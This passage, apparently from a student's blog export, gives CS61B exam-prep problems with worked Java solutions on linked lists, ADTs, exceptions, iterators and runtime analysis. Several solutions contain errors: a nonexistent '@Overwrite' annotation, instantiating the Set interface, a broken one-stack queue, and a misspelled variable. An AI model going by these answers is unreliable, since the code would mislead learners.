x)</span> </span>&#123; ... &#125;</span><br><span class="line"><span class="number">9</span> &#125;</span><br></pre></td></tr></table></figure>
<p>You think to yourself that the behavior of indexOf could be a bit confusing, so you<br>decide it should throw an error instead. In the space below, write a class called<br>SLListVista which has the same exact functionality of SLList, except SLListVista’s<br>indexOf method produces a NoSuchElementException in the case that x is not in<br>the list.<br>Since we have not covered exceptions yet, the following line of code can be used to<br>produce a NoSuchElementException:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.NoSuchElementException;</span><br><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">SLListVista</span><span class="params">()</span> extends SLList </span>&#123;</span><br><span class="line">    <span class="meta">@Overwrite</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="keyword">super</span>.indexOf(x);</span><br><span class="line">        <span class="keyword">if</span> (res == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="4-Dynamic-Method-Selection"><a href="#4-Dynamic-Method-Selection" class="headerlink" title="4 Dynamic Method Selection"></a>4 Dynamic Method Selection</h1><p>Modify the code below so that the max method of DMSList works properly. Assume<br>all numbers inserted into DMSList are positive. You may not change anything in<br>the given code. You may only fill in blanks. You may not need all blanks. (Spring<br>’17, MT1)</p>
<pre><code class="java"><span class="number">1</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DMSList</span> </span>{
<span class="number">2</span>       <span class="keyword">private</span> IntNode sentinel;
<span class="number">3</span>       <span class="function"><span class="keyword">public</span> <span class="title">DMSList</span><span class="params">()</span> </span>{
<span class="number">4</span>           sentinel = <span class="keyword">new</span> IntNode(-<span class="number">1000</span>, <span class="keyword">new</span> LastIntNode());
<span class="number">5</span>       }
<span class="number">6</span>       <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntNode</span> </span>{
<span class="number">7</span>           <span class="keyword">public</span> <span class="keyword">int</span> item;
<span class="number">8</span>           <span class="keyword">public</span> IntNode next;
<span class="number">9</span>           <span class="function"><span class="keyword">public</span> <span class="title">IntNode</span><span class="params">(<span class="keyword">int</span> i, IntNode h)</span> </span>{
<span class="number">10</span>              item = i;
<span class="number">11</span>              next = h;
<span class="number">12</span>          }
<span class="number">13</span>          <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> </span>{
<span class="number">14</span>              <span class="keyword">return</span> Math.max(item, next.max());
<span class="number">15</span>          }
<span class="number">16</span>      }
<span class="number">17</span>      <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LastIntNode</span> <span class="keyword">extends</span> <span class="title">IntNode</span> </span>{
            <span class="function"><span class="keyword">public</span> <span class="title">LastIntNode</span><span class="params">()</span> </span>{
                <span class="keyword">super</span>(<span class="number">0</span>, <span class="keyword">null</span>);
            }
            <span class="meta">@Overwrite</span>
            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> </span>{
                <span class="keyword">return</span> <span class="number">0</span>;
            }
<span class="number">26</span>      }
<span class="number">27</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> </span>{
<span class="number">28</span>          <span class="keyword">return</span> sentinel.next.max();
<span class="number">29</span>      }
<span class="number">30</span> }</code></pre>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep05</title>
    <url>/2018/10/06/cs61b-examprep05/</url>
    <content><![CDATA[<h1 id="Assorted-ADTs"><a href="#Assorted-ADTs" class="headerlink" title="Assorted ADTs"></a>Assorted ADTs</h1><p>A <strong>list</strong> is an ordered collection, or <em>sequence</em>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E element)</span></span>; <span class="comment">// add element to the end of the list</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span></span>; <span class="comment">// adds element at the given index</span></span><br><span class="line">  <span class="function">E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>; <span class="comment">// returns element at the given index</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// the number of elements in the list</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>A <strong>set</strong> is a (usually unordered) collection of unique elements.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(E element)</span></span>; <span class="comment">// adds element to the collection</span></span><br><span class="line">  <span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object object)</span></span>; <span class="comment">// checks if set containes object</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// number of elements in the set</span></span><br><span class="line">  <span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object object)</span></span>; <span class="comment">// removes specified object from set</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>A <strong>map</strong> is a collection of key-value mappings, like a dictionary in Python. Like a set, the keys in a map is unique.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function">V <span class="title">put</span><span class="params">(K key, V value)</span></span>; <span class="comment">// adds key-value pair to the map</span></span><br><span class="line">  <span class="function">V <span class="title">get</span><span class="params">(K key)</span></span>; <span class="comment">// returns value for the corresponding key</span></span><br><span class="line">  <span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(K key)</span></span>; <span class="comment">//checks if the map contains the specified key</span></span><br><span class="line">  <span class="function">Set&lt;K&gt; <span class="title">keySet</span><span class="params">()</span></span>; <span class="comment">// returns set of all keys in map</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Stacks and queues are two similar types of linear collections with special behavior.A <strong>stack</strong> is a last-in, first-out ADT: elements are always added or removed from one end of the data structure. A <strong>queue</strong> is a first-in, first-out ADT. Both data types support three basic operations: <code>push(e)</code> which adds an element, <code>peek()</code> which returns the next element, and <code>poll()</code> which returns and removes the next element.<br>Java defines an interface that combines both stacks and queues in the Deque. A <strong>deque</strong> (double ended queue, pronounced “deck”) is a linear collection that supports element insertion and removal at both ends.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Deque</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>; <span class="comment">// adds e to the front of deque</span></span><br><span class="line">  <span class="function">E <span class="title">removeFirst</span><span class="params">()</span></span>; <span class="comment">// removes and returns front element of deque</span></span><br><span class="line">  <span class="function">E <span class="title">getFirst</span><span class="params">()</span></span>; <span class="comment">// returns front element of deque</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">addLast</span><span class="params">(e)</span></span>; <span class="comment">// adds e to end of deque</span></span><br><span class="line">  <span class="function">E <span class="title">removeLast</span><span class="params">()</span></span>; <span class="comment">// removes and returns last element of deque</span></span><br><span class="line">  <span class="function">E <span class="title">getLast</span><span class="params">()</span></span>; <span class="comment">// returns last element of deque</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Generally-speaking, a <strong>priority queue</strong> is like a regular queue except each element has a priority associated with it which determines in what order elements are removed from the queue. In Java, <code>PriorityQueue</code> is a class, a heap data structure implementing the priority queue ADT. The priority is determined by either natural<br>order (<code>E implements Comparable&lt;E&gt;</code>) or a supplied <code>Comparator&lt;E&gt;</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PriorityQueue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>; <span class="comment">// adds element e to the priority queue</span></span><br><span class="line">  <span class="function">E <span class="title">peek</span><span class="params">()</span></span>; <span class="comment">// looks at the highest priority element, but does not remove it from the PQ</span></span><br><span class="line">  <span class="function">E <span class="title">poll</span><span class="params">()</span></span>; <span class="comment">// pops the highest priority element from the PQ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Use-them"><a href="#Use-them" class="headerlink" title="Use them"></a>Use them</h1><p>a. Given an array of integers A and an integer k, return true if any two numbers in the array sum up to k, and return false otherwise. How would you do this? Give the main idea and what ADT you would use.</p>
<p><span style="color:red">The fastest way to do this is with the help of a set (specifically, a HashSet, which has constant time add() and contains()). The key insight is that is that if a + b = x, then b = x - a. This means that we can look to see whether or not x - (current element) has been seen already. We can store every element that we look through in a set, and do a single pass through the array.</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">twoSum</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  Set&lt;Integer&gt; prevSeen = <span class="keyword">new</span> Set&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i : A) &#123;</span><br><span class="line">    <span class="keyword">if</span> (prevSeen.contains(k - i)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    prevSeen.add(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>b. Find the k most common words in a document. Assume that you can represent this as an array of Strings, where each word is an element in the array. You might find using multiple data structures useful.</p>
<p><span style="color:red">Keep a count of all the words in the document using a HashMap&lt;String, Integer&gt;. After we go through all of the words, each word will be mapped to how many times it’s appeared. What we can do is to put all the words into a MaxPriorityQueue<String>, using a custom comparator that compares words based on the counts in the HashMap. We can then pop off the k most common words by just calling poll() on the MaxPriorityQueue k times.</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">topKPopularWords</span> <span class="params">(String[] words, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  Map&lt;String, Integer&gt; counts = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!counts.containsKey(word)) &#123;</span><br><span class="line">      counts.put(word, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      counts.put(word, counts.get(word) + <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  PriorityQueue&lt;String&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="keyword">new</span> Comparator&lt;String&gt;()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span> <span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> counts.get(b) - counts.get(a);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">for</span> (String word : counts.keySet()) &#123;</span><br><span class="line">    pq.add(word);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">    System.out.println(pq.poll());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Mutant-ADTs"><a href="#Mutant-ADTs" class="headerlink" title="Mutant ADTs"></a>Mutant ADTs</h1><p>a. Define a Queue class that implements the push and poll methods of a queue ADT using only a Stack class which implements the stack ADT.<br><em>Hint: Try using two stacks</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;E&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span> <span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    stack.push(e);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> E <span class="title">poll</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> poll(stack.pop());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> E <span class="title">poll</span> <span class="params">(E previous)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">return</span> previous;</span><br><span class="line">    &#125;</span><br><span class="line">    E current = stack.poll();</span><br><span class="line">    E toReturn = poll(current);</span><br><span class="line">    stack.push(current);</span><br><span class="line">    <span class="keyword">return</span> toReturn;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>b. Suppose we wanted a data structure <code>SortedStack</code> that takes in integers, and maintains them in sorted order. <code>SortedStack</code> supports two operations: <code>push(int i)</code> and <code>pop()</code>. Pushing puts an int onto our <code>SortedStack</code>, and popping returns the next smallest item in the <code>SortedStack</code>. For example, if we inserted 10, 4, 8, 2, 14, and 3 into a <code>SortedStack</code>, and then popped everything off, we would get 2, 3, 4, 8, 10, 14.</p>
<p><span style="color:red">The solution to this is very similar to that of the question above. Once again,we will have two stacks, A and B. A will hold all the items, and B will be our buffer again. This time, when we add something to the queue, we continue to pop items off from A and push it onto B until the next item that will be popped(we can access this via peek()) is greater than or equal to the item we’re adding to it. At that point, we can push our item onto A, and then pop everything from B and push them back into A. Thus, we maintain the sorted-ness of our SortedStack.</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortedStack</span>&lt;<span class="title">Item</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Item</span>&gt;&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Item&gt; a;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Item&gt; b;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">SortedStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    a = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    b = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(Item i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!a.isEmpty() &amp;&amp; a.peek() &lt; i) &#123;</span><br><span class="line">      b.push(a.pop());</span><br><span class="line">    &#125;</span><br><span class="line">    a.push(i);</span><br><span class="line">    <span class="keyword">while</span> (!b.isEmpty()) &#123;</span><br><span class="line">      a.push(b.pop());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Item <span class="title">poll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.pop();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep06</title>
    <url>/2018/10/10/cs61b-examprep06/</url>
    <content><![CDATA[<h1 id="1-Exceptions-Spring-2016-MT2-Q3"><a href="#1-Exceptions-Spring-2016-MT2-Q3" class="headerlink" title="1 Exceptions (Spring 2016 MT2 Q3)"></a>1 Exceptions (Spring 2016 MT2 Q3)</h1><p>Consider the code below. Recall that x / 2 rounds down to the nearest integer.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkIfZero</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"x was zero!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(x); <span class="comment">// PRINT STATEMENT</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mystery</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            x = x / <span class="number">2</span>;</span><br><span class="line">            checkIfZero(x);</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">"counter is "</span> + counter); <span class="comment">// PRINT STATEMENT</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> counter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"mystery of 1 is "</span> + mystery(<span class="number">1</span>));</span><br><span class="line">    System.out.println(<span class="string">"mystery of 6 is "</span> + mystery(<span class="number">6</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>What will be the output when main is run?</p>
<a id="more"></a>

<p>mystery of 1 is 0<br>3<br>counter is 1<br>1<br>counter is 2<br>mystery of 6 is 2</p>
<h1 id="2-AltList-Summer-2016-MT2-Q2"><a href="#2-AltList-Summer-2016-MT2-Q2" class="headerlink" title="2 AltList (Summer 2016 MT2 Q2)"></a>2 AltList (Summer 2016 MT2 Q2)</h1><p>A normal generic linked list contains objects of only one type. But we can imagine<br>a generic linked list where entries alternate between two types. AltList is an<br>implementation of such a data structure:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AltList</span>&lt;<span class="title">X</span>, <span class="title">Y</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> X item;</span><br><span class="line">    <span class="keyword">private</span> AltList&lt;Y, X&gt; next;</span><br><span class="line"></span><br><span class="line">    AltList(X item, AltList&lt;Y, X&gt; next) &#123;</span><br><span class="line">        <span class="keyword">this</span>.item = item;</span><br><span class="line">        <span class="keyword">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let’s construct an AltList instance:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AltList&lt;Integer, String&gt; list =</span><br><span class="line">    <span class="keyword">new</span> AltList&lt;Integer, String&gt;(<span class="number">5</span>,</span><br><span class="line">        <span class="keyword">new</span> AltList&lt;String, Integer&gt;(<span class="string">"cat"</span>,</span><br><span class="line">            <span class="keyword">new</span> AltList&lt;Integer, String&gt;(<span class="number">10</span>,</span><br><span class="line">                <span class="keyword">new</span> AltList&lt;String, Integer&gt;(<span class="string">"dog"</span>, <span class="keyword">null</span>))));</span><br></pre></td></tr></table></figure>
<p>This list represents <code>[5 cat 10 dog]</code>. In this list, assuming indexing begins at 0, all even-index items are Integers and all odd-index items are Strings.<br>Write an instance method called <code>pairsSwapped()</code> for the AltList class that returns a copy of the original list, but with adjacent pairs swapped. Each item should only be swapped once. This method should be non-destructive: it should not modify the original AltList instance.<br>For example, calling list.pairsSwapped() should yield the list <code>[cat 5 dog 10]</code>. There were two swaps: ”cat” and 5 were swapped, then ”dog” and 10 were swapped. You may assume that the list on which <code>pairsSwapped()</code> is called has an even nonzero length. Your code should maintain this invariant.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AltList</span>&lt;<span class="title">X</span>, <span class="title">Y</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> AltList&lt;Y, X&gt; <span class="title">pairsSwapped</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        AltList&lt;Y, X&gt; ret = <span class="keyword">new</span> AltList&lt;Y, X&gt;(next.item, <span class="keyword">new</span> AltList&lt;X, Y&gt;(<span class="keyword">this</span>.item, <span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">if</span> (next.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret.next.next = next.next.pairsSwapped();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-Every-Kth-Element-Fall-2014-MT1-Q5"><a href="#3-Every-Kth-Element-Fall-2014-MT1-Q5" class="headerlink" title="3 Every Kth Element (Fall 2014 MT1 Q5)"></a>3 Every Kth Element (Fall 2014 MT1 Q5)</h1><p>Fill in the next() method in the following class. Do not modify anything outside of next.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.NoSuchElementException;</span><br><span class="line"><span class="comment">/** Iterates over every Kth element of the IntList given to the constructor.</span></span><br><span class="line"><span class="comment">* For example, if L is an IntList containing elements</span></span><br><span class="line"><span class="comment">* [0, 1, 2, 3, 4, 5, 6, 7] with K = 2, then</span></span><br><span class="line"><span class="comment">* for (Iterator&lt;Integer&gt; p = new KthIntList(L, 2); p.hasNext(); ) &#123;</span></span><br><span class="line"><span class="comment">*   System.out.println(p.next());</span></span><br><span class="line"><span class="comment">* &#125;</span></span><br><span class="line"><span class="comment">* would print get 0, 2, 4, 6. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KthIntList</span> <span class="keyword">implements</span> <span class="title">Iterator</span> &lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">private</span> IntList curList;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasNext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">KthIntList</span><span class="params">(IntList I, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.k = k;</span><br><span class="line">        <span class="keyword">this</span>.curList = I;</span><br><span class="line">        <span class="keyword">this</span>.hasNext = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns true iff there is a next Kth element. Do not modify. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hasNext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns the next Kth element of the IntList given in the constructor.</span></span><br><span class="line"><span class="comment">    * Returns the 0th element first. Throws a NoSuchElementException if</span></span><br><span class="line"><span class="comment">    * there are no Integers available to return. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (curList == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        Integer ret = curList.item;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k &amp;&amp; curList != <span class="keyword">null</span>; i++) &#123;</span><br><span class="line">            curList = currList.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep07</title>
    <url>/2018/10/31/cs61b-examprep07/</url>
    <content><![CDATA[<h1 id="1-It-Begins-Spring-2017-MT2"><a href="#1-It-Begins-Spring-2017-MT2" class="headerlink" title="1 It Begins (Spring 2017, MT2)"></a>1 It Begins (Spring 2017, MT2)</h1><p>For each code block below, fill in the blank(s) so that the function has the desired runtime. Do not use any commas. If the answer is impossible, just write “impossible” in the blank.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123; <span class="comment">//Desired Runtime: Θ(N)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;System.out.println(<span class="string">"hi"</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f2</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123; <span class="comment">//Desired Runtime: Θ(logN)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i *= <span class="number">2</span>) &#123;System.out.println(<span class="string">"hi"</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f3</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123; <span class="comment">//Desired Runtime: Θ(1)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i += N) &#123;System.out.println(<span class="string">"hi"</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="2-Slightly-Harder-Spring-2017-MT2"><a href="#2-Slightly-Harder-Spring-2017-MT2" class="headerlink" title="2 Slightly Harder (Spring 2017, MT2)"></a>2 Slightly Harder (Spring 2017, MT2)</h1><p>Give the runtime of the following functions in Θ or O notation as requested. Your answer should be as simple as possible with no unnecessary leading constatns or lower order terms. For f5, your bound should be as tight as possible (so don’t just put $O(N^{NM!})$ or similar for the second answer).</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f4</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">0</span>) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    f4(N / <span class="number">2</span>);</span><br><span class="line">    f4(N / <span class="number">2</span>);</span><br><span class="line">    f4(N / <span class="number">2</span>);</span><br><span class="line">    f4(N / <span class="number">2</span>);</span><br><span class="line">    g(N); <span class="comment">// runs in Θ(N2) time</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;span style=”color:red&gt;The runtime is $\Theta(N^2 logn)$</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f5</span><span class="params">(<span class="keyword">int</span> N, <span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">10</span>) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= N % <span class="number">10</span>; i++) &#123;</span><br><span class="line">        f5(N / <span class="number">10</span>, M / <span class="number">10</span>);</span><br><span class="line">        System.out.println(M);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The runtime is $O(n)$</span></p>
